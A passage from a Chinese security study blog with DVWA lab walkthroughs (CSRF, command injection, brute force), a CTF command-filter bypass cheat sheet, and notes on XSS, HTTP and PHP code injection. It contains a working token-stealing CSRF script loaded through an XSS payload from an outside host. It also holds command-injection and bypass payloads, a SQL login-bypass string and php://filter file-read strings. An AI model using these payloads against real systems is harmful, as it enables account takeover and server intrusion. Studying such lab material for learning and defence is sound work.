class="line">http://www.mengnankk.top/127.0.0.1.html</span><br></pre></td></tr></table></figure><p>这里有一个小细节，如果目标网站是 http 的话，那么 csrf 的这个 html 页面也要是 http 协议，如果是 https 协议的话 就会失败。</p><p>3.因为？后默认当做参数传递，这里因为 html 页面是不能接受参数的，所以随便输入是不影响实际的结果的，利用这个特点来绕过 referer 的检测。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.mengnankk.top/csrf.html?127.0.0.1</span><br></pre></td></tr></table></figure><h2 id="HIGH"><a href="#HIGH" class="headerlink" title="HIGH"></a>HIGH</h2><p>检查一下源代码，防线多了个token</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 检测用户的 user_token</span><br><span class="line">checkToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; );</span><br></pre></td></tr></table></figure><p>相对于 Low 级别，实际上就是增加了一个 token 检测，这样我们 CSRF 攻击的时候必须知道用户的 token 才可以成功。</p><p>通关思路：使用 XSS 来获取用户的 token ，然后将 token 放到 CSRF 的请求中。因为 HTML 无法跨域，这里我们尽量使用原生的 JS 发起 HTTP 请求才可以。</p><p>1.首先新建csrf.js</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 首先访问这个页面 来获取 token</span><br><span class="line">var tokenUrl = &#x27;http://127.0.0.1:8888/vulnerabilities/csrf/&#x27;;</span><br><span class="line"></span><br><span class="line">if(window.XMLHttpRequest) &#123;</span><br><span class="line">    xmlhttp = new XMLHttpRequest();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var count = 0;</span><br><span class="line">xmlhttp.withCredentials = true;</span><br><span class="line">xmlhttp.onreadystatechange=function()&#123;</span><br><span class="line">    if(xmlhttp.readyState ==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">          // 使用正则提取 token</span><br><span class="line">        var text = xmlhttp.responseText;</span><br><span class="line">        var regex = /user_token\&#x27; value\=\&#x27;(.*?)\&#x27; \/\&gt;/;</span><br><span class="line">        var match = text.match(regex);</span><br><span class="line">        var token = match[1];</span><br><span class="line">          // 发起 CSRF 请求 将 token 带入</span><br><span class="line">        var new_url = &#x27;http://127.0.0.1:8888/vulnerabilities/csrf/?user_token=&#x27;+token+&#x27;&amp;password_new=111&amp;password_conf=111&amp;Change=Change&#x27;;</span><br><span class="line">        if(count==0)&#123;</span><br><span class="line">            count++;</span><br><span class="line">            xmlhttp.open(&quot;GET&quot;,new_url,false);</span><br><span class="line">            xmlhttp.send();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlhttp.open(&quot;GET&quot;,tokenUrl,false);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure><p>然后将文件放在外网的服务器上，然后访问网页，直接发起xss测试，这里直接通过 script 标签的 src 来引入外部 js，访问之后此时密码就被更改为 111 了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8888/vulnerabilities/xss_d/?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;script src=&quot;http://www.sqlsec.com/csrf.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web dvwa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dvwa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dvwa CE</title>
      <link href="/2023/11/28/day999/"/>
      <url>/2023/11/28/day999/</url>
      
        <content type="html"><![CDATA[<h2 id="简介："><a href="#简介：" class="headerlink" title="简介："></a>简介：</h2><p>Command Injection（命令注入），就是指通过提交一些恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。</p><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>源代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">    // 确定操作系统并执行ping命令</span><br><span class="line">    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">        // Windows</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // *nix</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过代码可以发现，服务器仅仅只是判断了不同的操作系统执行不同的命令，并没有做其他的限制</p><p>注：操作符的使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A;B A 不论正确与否都会执行 B 命令</span><br><span class="line">A&amp;B A 后台运行，A 和 B 同时执行</span><br><span class="line">A&amp;&amp;B A 执行成功时候才会执行 B 命令</span><br><span class="line">A|B A 执行的输出结果，作为 B 命令的参数，A 不论正确与否都会执行 B 命令</span><br><span class="line">A||B A 执行失败后才会执行 B 命令</span><br></pre></td></tr></table></figure><p>运行127.0.0.1&amp;ls查看目录</p><p><img src="https://skymirror-1322372781.cos.ap-beijing.myqcloud.com/image-20231128184610117.png" alt="image-20231128184610117"></p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>源代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $target = $_REQUEST[ &#x27;ip&#x27; ];</span><br><span class="line"></span><br><span class="line">    // Set blacklist</span><br><span class="line">//设置命令黑名单，里面包含&amp;&amp;和；</span><br><span class="line">    $substitutions = array(</span><br><span class="line">        &#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // Remove any of the charactars in the array (blacklist).</span><br><span class="line">//将参数中有&amp;&amp;和；的都替换成空</span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">        // Windows</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // *nix</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>从源码中可以看出，相比于Low难度，增加了黑名单，将 “&amp;&amp;”，”;” 做了限制，将其改成空格，但是别的没有什么改变，在这里依旧可以通过 127.0.0.1 &amp; ipconfig 来绕过</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>源代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ]  ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $target = trim($_REQUEST[ &#x27;ip&#x27; ]);</span><br><span class="line"></span><br><span class="line">    // Set blacklist</span><br><span class="line">//设置命令黑名单，里面包含&amp; ；| - $ ( ) \ &#x27; ||</span><br><span class="line">    $substitutions = array(</span><br><span class="line">        &#x27;&amp;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;;&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;| &#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;-&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;$&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;(&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;)&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;`&#x27;  =&gt; &#x27;&#x27;,</span><br><span class="line">        &#x27;||&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    // Remove any of the charactars in the array (blacklist).</span><br><span class="line">//替换成空</span><br><span class="line">    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );</span><br><span class="line"></span><br><span class="line">    // Determine OS and execute the ping command.</span><br><span class="line">    if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123;</span><br><span class="line">        // Windows</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        // *nix</span><br><span class="line">        $cmd = shell_exec( &#x27;ping  -c 4 &#x27; . $target );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Feedback for the end user</span><br><span class="line">    echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>看到代码，发现黑名单中的限制更多了，像 ‘&amp;’，’| ‘，’||’，’;’，’$’ 等许多都加了限制，但是要仔细观察 ，比如说这个 ‘| ‘ ，它是在管道符后面加了个空格，因此考虑使用 127.0.0.1 |ipconfig 来绕过</p>]]></content>
      
      
      <categories>
          
          <category> web dvwa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dvwa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>dvwa BF</title>
      <link href="/2023/11/27/day333/"/>
      <url>/2023/11/27/day333/</url>
      
        <content type="html"><![CDATA[<h2 id="Brute-Force-暴力破解"><a href="#Brute-Force-暴力破解" class="headerlink" title="Brute Force 暴力破解"></a>Brute Force 暴力破解</h2><h2 id="low"><a href="#low" class="headerlink" title="low"></a>low</h2><p>1.手工注入 万能密码</p><p>admin ‘ or ‘1’&#x3D;’1</p><p>2.直接bp爆破</p><p>welcome to dvwa</p><h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>这个跟low差不多 只是增加了mysqli_real_escape_string()函数 这个函数会过滤一些特殊的符号 抵御一部分sql注入</p><p>ps:mysqli_real_escape_string()函数的作用是对字符串中的特殊字符进行转义，以防止SQL注入攻击。它将字符串中的特殊字符（如单引号、双引号、反斜杠等）转义为它们的转义序列，从而使其在SQL语句中不被误解为SQL命令的一部分。这样可以确保用户输入的数据不会破坏SQL查询语句的结构，同时保护数据库的安全性。</p><h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><p>这一关的区别在于token</p><p>注：Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。</p>]]></content>
      
      
      <categories>
          
          <category> web dvwa </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dvwa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF中命令执行绕过方法</title>
      <link href="/2023/11/23/day6/"/>
      <url>/2023/11/23/day6/</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a><strong>命令执行绕过</strong></h1><h2 id="escapeshellcmd函数绕过方法："><a href="#escapeshellcmd函数绕过方法：" class="headerlink" title="escapeshellcmd函数绕过方法："></a>escapeshellcmd函数绕过方法：</h2><p>1.执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。</p><p>payload&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">post=../ %1a whoami</span><br></pre></td></tr></table></figure><p>2.宽字节注入</p><h2 id="空格过滤："><a href="#空格过滤：" class="headerlink" title="空格过滤："></a>空格过滤：</h2><p>1.${IFS}</p><p>payload1&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat$&#123;IFS&#125;flag</span><br></pre></td></tr></table></figure><p>payload2&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat$&#123;IFS&#125;$9flag</span><br></pre></td></tr></table></figure><p>payload3&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat$IFS$9flag</span><br></pre></td></tr></table></figure><p>2.重定向符&lt;&gt;</p><p>payload1&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat&lt;&gt;flag</span><br></pre></td></tr></table></figure><p>payload2&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat&lt;flag</span><br></pre></td></tr></table></figure><h1 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h1><p>1.拼接</p><p>payload&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a=c;b=at;c=flag;$a$b $c</span><br></pre></td></tr></table></figure><p>2.利用已存在的资源</p><p>从已有的文件或者环境变量中获得相应的字符。</p><p>3.base64编码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">`echo &quot;Y2F0IGZsYWc=&quot;|base64 -d`</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash</span><br></pre></td></tr></table></figure><p>4.单引号、双引号</p><p>payload1&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&quot;&quot;at flag</span><br></pre></td></tr></table></figure><p>payload2&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&quot;&quot;at fl&quot;&quot;ag</span><br></pre></td></tr></table></figure><p>payload3&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c&quot;&quot;at fl&#x27;&#x27;ag</span><br></pre></td></tr></table></figure><p>5.反斜线 \</p><p>payload&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c\at fl\ag</span><br></pre></td></tr></table></figure><p>6.LINUX下一些已有字符</p><ul><li>${PS2} 对应字符 ‘&gt;’</li><li>${PS4} 对应字符 ‘+’</li><li>${IFS} 对应 内部字段分隔符</li><li>${9} 对应 空字符串</li></ul>]]></content>
      
      
      <categories>
          
          <category> web php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss攻击基础了解</title>
      <link href="/2023/11/23/day7/"/>
      <url>/2023/11/23/day7/</url>
      
        <content type="html"><![CDATA[<h1 id="XSS攻击"><a href="#XSS攻击" class="headerlink" title="XSS攻击"></a>XSS攻击</h1><h2 id="XSS的了解"><a href="#XSS的了解" class="headerlink" title="XSS的了解"></a>XSS的了解</h2><p>跨站脚本攻击（Cross-site scripting，XSS）是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。若受害者运行这些恶意代码，攻击者就可以突破网站的访问限制并冒充受害者。根据开放式 Web 应用安全项目（OWASP），XSS 在 2017 年被认为 <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A7-Cross-Site_Scripting_(XSS)">7 种最常见的 Web 应用程序漏洞之一</a>。</p><p>如果 Web 应用程序没有部署足够的安全验证，那么，这些攻击很容易成功。浏览器无法探测到这些恶意脚本是不可信的，所以，这些脚本可以任意读取 cookie，session tokens，或者其他敏感的网站信息，或者让恶意脚本重写<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/HTML">HTML</a>内容。</p><p>在以下 2 种情况下，容易发生 XSS 攻击：</p><ol><li><p>数据从一个不可靠的链接进入到一个 Web 应用程序。</p></li><li><p>没有过滤掉恶意代码的动态内容被发送给 Web 用户。</p><p>恶意内容一般包括 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/JavaScript">JavaScript</a>，但是，有时候也会包括 HTML，FLASH 或是其他浏览器可执行的代码。XSS 攻击的形式千差万别，但他们通常都会：将 cookies 或其他隐私信息发送给攻击者，将受害者重定向到由攻击者控制的网页，或是经由恶意网站在受害者的机器上进行其他恶意操作。</p><p>XSS 攻击可以分为 3 类：存储型（持久型）、反射型（非持久型）、DOM 型。</p><ul><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting#%E5%AD%98%E5%82%A8%E5%9E%8B_xss"><strong>存储型 XSS</strong></a></p><p>注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting#%E5%8F%8D%E5%B0%84%E5%9E%8B_xss"><strong>反射型 XSS</strong></a></p><p>当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web 服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自”可信任”的服务器，所以会执行这段脚本。</p></li><li><p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/Cross-site_scripting#%E5%9F%BA%E4%BA%8E_dom_%E7%9A%84_xss"><strong>基于 DOM 的 XSS</strong></a></p><p>通过修改原始的客户端代码，受害者浏览器的 DOM 环境改变，导致有效载荷的执行。也就是说，页面本身并没有变化，但由于 DOM 环境被恶意修改，有客户端代码被包含进了页面，并且意外执行。</p></li></ul></li></ol><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>XSS和SQLI、RCE本质上都是注入类漏洞，核心要义都是构造payload逃逸程序原有的处理逻辑进而欺骗目标系统执行恶意代码。</p><p>XSS将恶意代码注入到网页中，使用户加载并执行攻击者恶意制造的网页程序。恶意代码通常是JavaScript、Java组件，VBScript，ActiveX，Flash或者就是原生的HTML。</p>]]></content>
      
      
      <categories>
          
          <category> web xss </category>
          
      </categories>
      
      
        <tags>
            
            <tag> host </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web day2</title>
      <link href="/2023/11/20/day3/"/>
      <url>/2023/11/20/day3/</url>
      
        <content type="html"><![CDATA[<h1 id="http协议与https协议"><a href="#http协议与https协议" class="headerlink" title="http协议与https协议"></a>http协议与https协议</h1><h2 id="http简介"><a href="#http简介" class="headerlink" title="http简介"></a>http简介</h2><p>1.HTTP 协议是 Hyper Text Transfer Protocol（超文本传输协议）的缩写，是用于从万维网（ WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议.</p><p>2.http协议是基于tcp&#x2F;ip协议来传输数据（html文件、图片文件、查询结果等）</p><p>3.http的url是由http:&#x2F;&#x2F;起始，默认使用端口为80</p><h2 id="http工作原理"><a href="#http工作原理" class="headerlink" title="http工作原理"></a>http工作原理</h2><p>1.http协议工作于客户端-服务器架构上</p><p>2.浏览器作为http客户端通过url向http服务端即web服务器发送所有的请求。</p><p>3.web服务器接受到请求后，向客户端发送响应信息</p><p>4.http的默认端口号为80，但可以改为其他的端口</p><p><img src="https://www.runoob.com/wp-content/uploads/2013/11/cgiarch.gif" alt="cgiarch"></p><p>http协议的工作原理示意图</p><h1 id="https简介"><a href="#https简介" class="headerlink" title="https简介"></a>https简介</h1><p>https经由http进行通信，但是利用ssl&#x2F;tls来加密数据包，https的开发的主要目的是提供对网站服务器的身份认证，保护交换资料的隐私和完整性。</p><p>https的url是由https:&#x2F;&#x2F;起始，默认端口为443</p><h2 id="https的作用"><a href="#https的作用" class="headerlink" title="https的作用"></a>https的作用</h2><p>信任的情况：</p><p>与一个网站之间的 HTTPS 连线仅在这些情况下可被信任：</p><ul><li>浏览器正确地实现了 HTTPS 且操作系统中安装了正确且受信任的证书颁发机构；</li><li>证书颁发机构仅信任合法的网站；</li><li>被访问的网站提供了一个有效的证书，也就是说它是一个由操作系统信任的证书颁发机构签发的（大部分浏览器会对无效的证书发出警告）；（可以人为的添加证书，如bp的使用则需要人为的给浏览器添加证书）</li><li>该证书正确地验证了被访问的网站（例如，访问 <a href="https://www.runoob.com/">https://www.runoob.com</a> 时收到了签发给 <a href="http://www.runoob.com/">www.runoob.com</a> 而不是其它域名的证书）；</li><li>此协议的加密层（SSL&#x2F;TLS）能够有效地提供认证和高强度的加密。</li></ul>]]></content>
      
      
      <categories>
          
          <category> web basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web day3</title>
      <link href="/2023/11/20/day4/"/>
      <url>/2023/11/20/day4/</url>
      
        <content type="html"><![CDATA[<h1 id="web基础知识"><a href="#web基础知识" class="headerlink" title="web基础知识"></a>web基础知识</h1><h2 id="php文件有以下几种备份的格式"><a href="#php文件有以下几种备份的格式" class="headerlink" title="php文件有以下几种备份的格式:"></a>php文件有以下几种备份的格式:</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.git .svn .swp .bak .bash-history</span><br></pre></td></tr></table></figure><p>类如</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.php.git</span><br></pre></td></tr></table></figure><h2 id="robots协议"><a href="#robots协议" class="headerlink" title="robots协议"></a>robots协议</h2><p>robots协议规定了哪些东西可以抓取，哪些东西不能够抓取。robots.txt是一个文本文件也是一个协议。其可以在搜索引擎中访问网站中要查看的第一个文件。</p><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p>cookie是主机访问web服务器由服务器创建的，将信息储存在用户计算机上的文件，一般用户习惯使用cookies</p><p>cookie的使用：</p><p>1..判断用户是否已经登录网站</p><p>2.购物车网站用户跳转保存在其中的数据</p><p>3.等等等</p><h2 id="php对于文件的读取"><a href="#php对于文件的读取" class="headerlink" title="php对于文件的读取"></a>php对于文件的读取</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><h3 id="组成解析"><a href="#组成解析" class="headerlink" title="组成解析"></a>组成解析</h3><p>1.php:&#x2F;&#x2F;filter&#x2F;可以作为一个中间流来处理其他流，可以进行任意文件的读取。</p><p>2.read&#x3D;convert.base64-encode&#x2F;resource将数据转换为base64编码来读取数据</p><p>3.&#x3D;index.php读取的文件</p><h3 id="添加："><a href="#添加：" class="headerlink" title="添加："></a>添加：</h3><p>读取上级目录文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=.../.../a.txt</span><br></pre></td></tr></table></figure><p>读取其他的目录文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=F：\b.txt</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> basic </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php命令注入及其实例</title>
      <link href="/2023/11/20/day5/"/>
      <url>/2023/11/20/day5/</url>
      
        <content type="html"><![CDATA[<h1 id="php注入概述"><a href="#php注入概述" class="headerlink" title="php注入概述"></a>php注入概述</h1><p>rce概念：remote command&#x2F;code execute，远程命令&#x2F;代码执行。</p><p>php代码执行：在web中，php代码执行是指应用程序过滤不严，用户可通过http请求将代码注入到应用中执行</p><p>php代码注入与sql注入比较：</p><p>注入的思想类似，均是构造语句绕过服务器的过滤去执行。</p><p>区别在于sql注入是将语句注入到数据库中执行，而php代码执行是可以将代码注入到应用中，最终由服务器运行。</p><p>php代码注入的条件：</p><p>1.程序中含有可以执行php代码的函数或者语言结构</p><p>2.传入该函数或者语言结构的参数是可以由客户端控制的（可以直接修改或者造成影响）且应用过滤不严。</p><p>危害：</p><p>这样的漏洞如果没有特殊的过滤，相当于一个web后门的存在，攻击者可以执行漏洞继承web用户权限，执行任意代码。如果服务器没有正确配置或者web用户权限比较高的话，还可以读写靶机服务器任意文件的内容，甚至控制整个网站或者服务器。</p><h1 id="相关的函数或语言结构"><a href="#相关的函数或语言结构" class="headerlink" title="相关的函数或语言结构"></a>相关的函数或语言结构</h1><h2 id="1-eval-函数"><a href="#1-eval-函数" class="headerlink" title="1.eval()函数"></a>1.eval()函数</h2><p>作用：该函数的作用是将字符串作为PHP代码执行。</p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">$code=$_GET[&#x27;code&#x27;];</span><br><span class="line">eval($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;Please submit code!&lt;br &gt;code=phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过浏览器访问上述函数所在网页时，可以通过传递参数该code来执行PHP探针。主要方式有以下几种：<br>①普通方式提交变量：<code>?code=phpinfo();</code><br>②以语句块方式提交变量：<code>?code=&#123;phpinfo();&#125;</code><br>③以多语句方式提交参数：<code>?code=1;phpinfo();</code></p><p>payload:?code&#x3D;</p><h2 id="2-assert-函数"><a href="#2-assert-函数" class="headerlink" title="2.assert()函数"></a>2.assert()函数</h2><p>作用：该函数的作用是将字符串作为PHP代码执行。如果它的条件返回错误，则终止程序执行。</p><p>例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class="line">$code=$_GET[&#x27;code&#x27;];</span><br><span class="line">assert($code);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;Please submit code!&lt;br &gt;?code=phpinfo();&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>普通方式提交变量：<code>?code=phpinfo()</code>或者<code>?code=phpinfo();</code><br>与eval()函数有别的是，该函数不能执行传入语句块或多语句作为参数。</p><h2 id="3-preg-replace-函数"><a href="#3-preg-replace-函数" class="headerlink" title="3.preg_replace()函数"></a>3.preg_replace()函数</h2><p>作用：该函数用于对字符串进行正则处理。</p><p>解析：preg_replace 函数一个参数是一个正则表达式，按照 php的格式，表达式在两个&#x2F;之间，如果在表达式末尾加上一个 e，则第二个参数就会被当做 php代码执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @preg_replace(&quot;/abcd/e&quot;,$_POST[&#x27;hacker&#x27;],&quot;abcdefg&quot;); ?&gt;</span><br></pre></td></tr></table></figure><p>通过浏览器访问上述函数所在网页时，可以通过传递参数该code来执行PHP探针。主要方式有以下几种：<br>①普通方式提交变量：?code&#x3D;[phpinfo();]，[]是由于preg_replace的第一个参数有分号。<br>②以语句块方式提交变量：?code&#x3D;{[phpinfo();]}<br>③以多语句方式提交参数：?code&#x3D;1;[phpinfo();]</p>]]></content>
      
      
      <categories>
          
          <category> web php </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web day1</title>
      <link href="/2023/11/16/day2/"/>
      <url>/2023/11/16/day2/</url>
      
        <content type="html"><![CDATA[<p><strong>01.get&amp;&amp;post的区别：</strong></p><p>1.传送方式的不同：get通过url进行传参，而post通过dao文传输。</p><p>2.传送长度的不同：get因为通过url栏进行传参，所以其长度是有限的，受限于url栏的长度。而post则没有限制。</p><p>3.get产生一个tcp数据包，而Post产生两个数据包。</p><p>get请求，浏览器会把header和data一起发送出去，服务器响应200</p><p>post请求，浏览器会先发送header，然后服务器响应100，之后再发送data，浏览器响应200。</p><p>4.get请求是幂等的，即多次请求同一个资源会得到相同的结果，而post请求是非幂等的，即多次请求之后对同一个资源会产生不同的结果。</p><p>5.get请求通常用来获取资源，而post请求通常用来提交数据发送表单，进行状态修改等操作。</p><p>6.get请求可以缓存，可以被存为书签，可以被浏览器的历史纪录查询，而post请求则都不能。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url/?...=...</span><br></pre></td></tr></table></figure><p><strong>02url栏的组成</strong></p><p>例子：<a 